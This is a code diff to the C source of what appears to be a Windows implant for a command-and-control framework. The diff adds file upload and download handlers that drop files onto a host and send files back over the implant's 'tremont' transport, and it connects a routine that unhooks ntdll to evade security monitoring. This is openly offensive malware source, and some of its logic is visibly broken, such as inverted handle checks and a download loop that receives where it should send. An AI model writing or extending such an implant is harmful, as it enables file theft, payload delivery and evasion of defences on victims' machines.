@@ -4,6 +4,7 @@
 #include<Psapi.h>
 
 #include "../transport/transport.h"
+#include "../ctrl.h"
 #include "jobs.h"
 
 int track_job(HANDLE* job_thread, struct jobs_t* jobs) {
@@ -190,23 +191,132 @@ void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
     _cleanup_powershell(&info);
 }
 
-int implant_upload(struct upload_req_t* req) {
-    /*
-        Expand path
-        CreateFileA
-        recv
-        write to file
-    */
+int implant_upload(struct wrkr_trans_t* trans, struct upload_req_t* req) {
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream_id = trans->stream_id;
+    
+    char full_path_buf[256];
+    memset(full_path_buf, 0, sizeof(full_path_buf));
+
+    GetFullPathNameA(req->dest_path,
+        sizeof(full_path_buf),
+        full_path_buf,
+        NULL
+    );
+
+    HANDLE file_handle;
+    file_handle = CreateFileA(full_path_buf,
+        GENERIC_WRITE,
+        FILE_SHARE_READ,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    struct wrkr_msg_t msg;
+    msg.msg_enum = UPLOAD;
+    msg.upload.msg_enum = RES;
+    
+    if (file_handle != 0)
+        msg.upload.res.allowed = 1;
+    else
+        msg.upload.res.allowed = 0;
+
+    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+    if (file_handle != 0) return -1;
+
+    int64_t total_recvd = 0;
+    int64_t total_size = req->file_len;
+    
+    int recvd = 0;
+    int written = 0;
+    char temp_buf[255];
+
+    while (total_recvd < total_size) {
+        recvd = tremont_recv(stream_id,
+            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        WriteFile(file_handle, temp_buf, recvd, &written, 0);
+        total_recvd += recvd;
+    }
+    
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = UPLOAD;
+    msg.upload.msg_enum = FIN;
+    msg.upload.fin.sanity = 1;
+
+    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(stream_id, (byte*)&msg, sizeof(msg), nexus);
+
+    tremont_end_stream(stream_id, nexus);
     return 0;
 }
 
-int implant_download(struct download_req_t* req) {
-    /*
-        Expand path
-        CreateFileA
-        read from file
-        send
-    */
+int implant_download(struct wrkr_trans_t* trans, struct download_req_t* req) {
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream_id = trans->stream_id;
+
+    char full_path_buf[256];
+    memset(full_path_buf, 0, sizeof(full_path_buf));
+
+    GetFullPathNameA(req->path,
+        sizeof(full_path_buf),
+        full_path_buf,
+        NULL
+    );
+
+    HANDLE file_handle;
+    file_handle = CreateFileA(full_path_buf,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    struct wrkr_msg_t msg;
+    msg.msg_enum = DOWNLOAD;
+    msg.download.msg_enum = RES;
+
+    int64_t total_size = 0;
+
+    if (file_handle != 0) {
+        GetFileSizeEx(file_handle, (PLARGE_INTEGER)&total_size);
+        msg.download.res.allowed = 1;
+        msg.download.res.file_len = total_size;
+    }
+    else msg.upload.res.allowed = 0;
+
+    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+    if (file_handle != 0) return -1;
+
+    int64_t total_sent = 0;
+    int sent = 0;
+    int read = 0;
+    char temp_buf[255];
+
+    while (total_sent < total_size) {
+        ReadFile(file_handle, temp_buf, 
+            sizeof(temp_buf), &read, 0);
+        sent = tremont_recv(stream_id,
+            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        total_sent += sent;
+    }
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = DOWNLOAD;
+    msg.upload.msg_enum = FIN;
+    msg.upload.fin.sanity = 1;
+
+    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(stream_id, (byte*)&msg, sizeof(msg), nexus);
+
+    tremont_end_stream(stream_id, nexus);
     return 0;
 }
 
@@ -267,7 +377,7 @@ void _unfreeze_all_other_threads() {
 }
 
 //based off of https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
-int implant_unhookl(struct unhool_req_t* req) {
+int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
     _freeze_all_other_threads();
 
     MODULEINFO module_info;
@@ -351,6 +461,20 @@ int implant_unhookl(struct unhool_req_t* req) {
     CloseHandle(ntdll_module);
     CloseHandle(ntdll_file);
 
+    struct wrkr_msg_t msg;
+    msg.msg_enum = UNHOOK_L;
+    msg.upload.msg_enum = FIN;
+    msg.upload.fin.sanity = 1;
+
+    tremont_send(trans->stream_id, (byte*)&msg, 
+        sizeof(msg), trans->nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    tremont_end_stream(trans->stream_id, trans->nexus);
+
     return 0;
 
 ERR:
@@ -358,5 +482,6 @@ ERR:
     CloseHandle(process_handle);
     CloseHandle(ntdll_module);
     CloseHandle(ntdll_file);
+    tremont_end_stream(trans->stream_id, trans->nexus);
     return -1;
 }
